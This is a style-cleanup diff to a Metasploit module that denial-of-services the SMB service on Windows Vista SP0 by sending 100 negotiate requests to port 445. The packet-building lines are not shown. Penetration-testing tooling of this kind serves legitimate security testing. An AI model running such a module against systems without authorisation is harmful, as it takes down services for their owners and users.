@@ -1,40 +1,37 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft Vista SP0 SMB Negotiate Protocol DoS',
-      'Description'    => %q{
-        This module exploits a flaw in Windows Vista that allows a remote
-      unauthenticated attacker to disable the SMB service. This vulnerability
-      was silently fixed in Microsoft Vista Service Pack 1.
-      },
+                      'Name'           => 'Microsoft Vista SP0 SMB Negotiate Protocol DoS',
+                      'Description'    => %q(
+                        This module exploits a flaw in Windows Vista that allows a remote
+                      unauthenticated attacker to disable the SMB service. This vulnerability
+                      was silently fixed in Microsoft Vista Service Pack 1.
+                      ),
 
-      'Author'         => [ 'hdm' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'OSVDB', '64341'],
-        ]
-    ))
+                      'Author'         => [ 'hdm' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'OSVDB', '64341']
+                        ]))
 
     register_options([Opt::RPORT(445)], self.class)
   end
 
   def run
-
-    print_status("Sending 100 negotiate requests...");
+    print_status("Sending 100 negotiate requests...")
 
     # 100 requests ensure that the bug is reliably hit
     1.upto(100) do |i|
-
       begin
 
         connect
@@ -57,14 +54,12 @@ class MetasploitModule < Msf::Auxiliary
         disconnect
 
       rescue ::Interrupt
-        raise $!
+        raise $ERROR_INFO
 
       rescue ::Exception
-        print_error("Error at iteration #{i}: #{$!.class} #{$!}")
+        print_error("Error at iteration #{i}: #{$ERROR_INFO.class} #{$ERROR_INFO}")
         return
       end
-
     end
-
   end
 end
